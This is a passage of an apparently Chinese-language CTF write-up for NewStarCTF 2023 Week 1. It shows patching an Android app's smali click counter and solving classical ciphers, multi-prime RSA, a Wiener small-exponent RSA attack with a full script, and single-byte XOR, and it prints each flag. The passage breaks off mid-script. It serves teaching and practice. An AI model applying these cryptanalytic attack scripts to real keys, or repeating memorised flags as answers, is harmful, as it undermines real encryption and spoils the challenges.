class="line"></span><br><span class="line">    const/<span class="number">4</span> v1, <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;p1, v0, v1&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;</span><br><span class="line"></span><br><span class="line">    move-result-object p1</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p1&#125;, Landroid/widget/Toast;-&gt;show()V</span><br><span class="line"></span><br><span class="line">    :cond_0</span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.end method</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现其中的<code>const/16 v0, 0x2710</code>，其存储为点击次数，将其改为0x1，重新编译安装，打开后点击按钮直接得到flag</p><img src="/2023/09/26/2023newstarctfWeek1/apkre.png" class=""><p><code>flag&#123;Act1v1ty_!s_so00oo0o_lmpor#an#&#125;</code></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>解题 10&#x2F;10</p><h3 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h3><p>下载附件，得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;++++++.&gt;----.&lt;-----.&gt;-----.&gt;-----.&lt;&lt;&lt;-.&gt;&gt;++..&lt;.&gt;.++++++.....------.&lt;.&gt;.&lt;&lt;&lt;&lt;&lt;+++.&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;+++++++.&gt;&gt;&gt;+.&lt;&lt;&lt;-------.&gt;&gt;&gt;-.&lt;&lt;&lt;+.+++++++.--..&gt;&gt;&gt;&gt;---.-.&lt;&lt;&lt;&lt;-.+++.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;-------.+.&gt;&gt;&gt;&gt;&gt;++.</span><br></pre></td></tr></table></figure><p><a href="https://ctf.bugku.com/tool/brainfuck">Brainfuck&#x2F;OoK加密解密 - Bugku CTF</a>，解密一下，得到flag：<code>flag&#123;Oiiaioooooiai#b7c0b1866fe58e12&#125;</code></p><h3 id="Caesar’s-Secert"><a href="#Caesar’s-Secert" class="headerlink" title="Caesar’s Secert"></a>Caesar’s Secert</h3><p>打开附件，得到<code>kqfl&#123;hf3x4w&#39;x_h1umjw_n5_a4wd_3fed&#125;</code></p><p>凯撒枚举<a href="https://ctf.bugku.com/tool/caesar">凯撒(Caesar)加密&#x2F;解密 - Bugku CTF</a>，得到flag：<code>flag&#123;ca3s4r&#39;s_c1pher_i5_v4ry_3azy&#125;</code></p><h3 id="Fence"><a href="#Fence" class="headerlink" title="Fence"></a>Fence</h3><p>附件内容：<code>fa&#123;ereigtepanet6680&#125;lgrodrn_h_litx#8fc3</code></p><p>栅栏加密<a href="https://ctf.bugku.com/tool/railfence">栅栏加密&#x2F;解密 - Bugku CTF</a>，枚举解密，得到flag：<code>flag&#123;reordering_the_plaintext#686f8c03&#125;</code></p><h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenère"></a>Vigenère</h3><p>附件：<code>pqcq&#123;qc_m1kt4_njn_5slp0b_lkyacx_gcdy1ud4_g3nv5x0&#125;</code></p><p>维吉尼亚解密<a href="https://ctf.bugku.com/tool/vigenere">维吉尼亚加密&#x2F;解密 - Bugku CTF</a>，密钥用flag前4个字母尝试一下得到：KFC</p><p>得到flag：<code>flag&#123;la_c1fr4_del_5ign0r_giovan_batt1st4_b3ll5s0&#125;</code></p><h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p>打开附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>(<span class="params">n</span>):</span><br><span class="line">    res = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        res *= getPrime(n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n = gen_prime(<span class="number">32</span>)</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line"><span class="comment"># 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br></pre></td></tr></table></figure><p>使用大整数分解网站<a href="http://www.factordb.com/index.php?id=1100000004708746782">factordb.com</a>，将其分解为多个质数之积</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1729006607...61&lt;143&gt; = 2217990919&lt;10&gt; · 2338725373&lt;10&gt; · 2370292207&lt;10&gt; · 2463878387&lt;10&gt; · 2706073949&lt;10&gt; · 2794985117&lt;10&gt; · 2804303069&lt;10&gt; · 2923072267&lt;10&gt; · 2970591037&lt;10&gt; · 3207148519&lt;10&gt; · 3654864131&lt;10&gt; · 3831680819&lt;10&gt; · 3939901243&lt;10&gt; · 4093178561&lt;10&gt; · 4278428893&lt;10&gt;</span><br></pre></td></tr></table></figure><p>解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"></span><br><span class="line">n = <span class="number">2217990919</span> * <span class="number">2338725373</span> * <span class="number">2370292207</span> * <span class="number">2463878387</span> * <span class="number">2706073949</span> * <span class="number">2794985117</span> * <span class="number">2804303069</span> * <span class="number">2923072267</span> * <span class="number">2970591037</span> * <span class="number">3207148519</span> * <span class="number">3654864131</span> * <span class="number">3831680819</span> * <span class="number">3939901243</span> * <span class="number">4093178561</span> * <span class="number">4278428893</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试分解 n</span></span><br><span class="line">factors = [<span class="number">2217990919</span>, <span class="number">2338725373</span>, <span class="number">2370292207</span>, <span class="number">2463878387</span>, <span class="number">2706073949</span>, <span class="number">2794985117</span>, <span class="number">2804303069</span>, <span class="number">2923072267</span>, <span class="number">2970591037</span>, <span class="number">3207148519</span>, <span class="number">3654864131</span>, <span class="number">3831680819</span>, <span class="number">3939901243</span>, <span class="number">4093178561</span>, <span class="number">4278428893</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 phi(n)</span></span><br><span class="line">phi_n = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> factor <span class="keyword">in</span> factors:</span><br><span class="line">    phi_n *= (factor - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算私钥 d</span></span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密密文得到明文</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将明文转换为字节形式</span></span><br><span class="line">flag = m.to_bytes((m.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="Small-d"><a href="#Small-d" class="headerlink" title="Small d"></a>Small d</h3><p>打开附件py代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">d = getPrime(<span class="number">32</span>)</span><br><span class="line">e = inverse(d, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span></span><br><span class="line"><span class="comment"># e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></span><br><span class="line"><span class="comment"># n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></span><br></pre></td></tr></table></figure><p>看到d数值比较小，使用低解密指数攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rational_to_contfrac</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Converts a rational x/y fraction into</span></span><br><span class="line"><span class="string">    a list of partial quotients [a0, ..., an]</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    a = x//y</span><br><span class="line">    pquotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x,y = y,x-a*y</span><br><span class="line">        a = x//y</span><br><span class="line">        pquotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> pquotients</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents_from_contfrac</span>(<span class="params">frac</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    computes the list of convergents</span></span><br><span class="line"><span class="string">    using the list of partial quotients</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    convs = [];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frac)):</span><br><span class="line">        convs.append(contfrac_to_rational(frac[<span class="number">0</span>:i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contfrac_to_rational</span> (frac):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Converts a finite continued fraction [a0, ..., an]</span></span><br><span class="line"><span class="string">     to an x/y rational.</span></span><br><span class="line"><span class="string">     &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(frac) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    num = frac[-<span class="number">1</span>]</span><br><span class="line">    denom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>,-<span class="built_in">len</span>(frac)-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        num, denom = frac[_]*num+denom, num</span><br><span class="line">    <span class="keyword">return</span> (num,denom)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Extended Euclidean Algorithm</span></span><br><span class="line"><span class="string">    returns x, y, gcd(a,b) such that ax + by = gcd(a,b)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    u, u1 = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    v, v1 = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        q = a // b</span><br><span class="line">        u, u1 = u1, u - q * u1</span><br><span class="line">        v, v1 = v1, v - q * v1</span><br><span class="line">        a, b = b, a - q * b</span><br><span class="line">    <span class="keyword">return</span> u, v, a</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    2.8 times faster than egcd(a,b)[2]</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    a,b=(b,a) <span class="keyword">if</span> a&lt;b <span class="keyword">else</span> (a,b)</span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a,b=b,a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modInverse</span>(<span class="params">e,n</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    d such that de = 1 (mod n)</span></span><br><span class="line"><span class="string">    e must be coprime to n</span></span><br><span class="line"><span class="string">    this is assumed to be true</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> egcd(e,n)[<span class="number">0</span>]%n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">totient</span>(<span class="params">p,q</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Calculates the totient of pq</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bitlength</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Calculates the bitlength of x</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> x &gt;= <span class="number">0</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">        x = x&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Calculates the integer square root</span></span><br><span class="line"><span class="string">    for arbitrary large nonnegative integers</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;square root not defined for negative numbers&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    a, b = <span class="built_in">divmod</span>(bitlength(n), <span class="number">2</span>)</span><br><span class="line">    x = <span class="number">2</span>**(a+b)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        y = (x + n//x)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> y &gt;= x:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">        x = y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_perfect_square</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    If n is a perfect square it returns sqrt(n),</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    otherwise returns -1</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    h = n &amp; <span class="number">0xF</span>; <span class="comment">#last hexadecimal &quot;digit&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> h &gt; <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span> <span class="comment"># return immediately in 6 cases out of 16.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Take advantage of Boolean short-circuit evaluation</span></span><br><span class="line">    <span class="keyword">if</span> ( h != <span class="number">2</span> <span class="keyword">and</span> h != <span class="number">3</span> <span class="keyword">and</span> h != <span class="number">5</span> <span class="keyword">and</span> h != <span class="number">6</span> <span class="keyword">and</span> h != <span class="number">7</span> <span class="keyword">and</span> h != <span class="number">8</span> ):</span><br><span class="line">        <span class="comment"># take square root if you must</span></span><br><span class="line">        t = isqrt(n)</span><br><span class="line">        <span class="keyword">if</span> t*t == n:</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wiener_hack</span>(<span class="params">e, n</span>):</span><br><span class="line">    frac = rational_to_contfrac(e, n)</span><br><span class="line">    convergents = convergents_from_contfrac(frac)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            discr = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">                t = is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t != -<span class="number">1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Hacked!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    n = <span class="number">19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></span><br><span class="line">    e = <span class="number">8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></span><br><span class="line">    c = <span class="number">6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span></span><br><span class="line">    d = wiener_hack(e, n)</span><br><span class="line">    m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">    <span class="built_in">print</span> (long_to_bytes(m))</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>拿到flag：<code>flag&#123;learn_some_continued_fraction_technique#dc16885c&#125;</code></p><h3 id="babyxor"><a href="#babyxor" class="headerlink" title="babyxor"></a>babyxor</h3><p>打开附件，得到一段python：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ciphertext = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag:</span><br><span class="line">    ciphertext.append(f ^ key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ciphertext).<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span></span><br></pre></td></tr></table></figure><p>由于已知flag是<code>flag&#123;</code>开头的，所以我们可以得到key的值，编写解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ciphertext_hex = <span class="string">&#x27;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将16进制字符串转换为字节列表</span></span><br><span class="line">ciphertext_bytes = <span class="built_in">bytes</span>.fromhex(ciphertext_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密密文</span></span><br><span class="line">plaintext = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ciphertext_bytes:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">chr</span>(c))^<span class="number">143</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment">#plaintext.append(c ^ key)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字节列表转换为字符串</span></span><br><span class="line">plaintext_str = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(p) <span class="keyword">for</span> p <span class="keyword">in</span> plaintext])</span><br><span class="line"></span><br><span class="line"><span 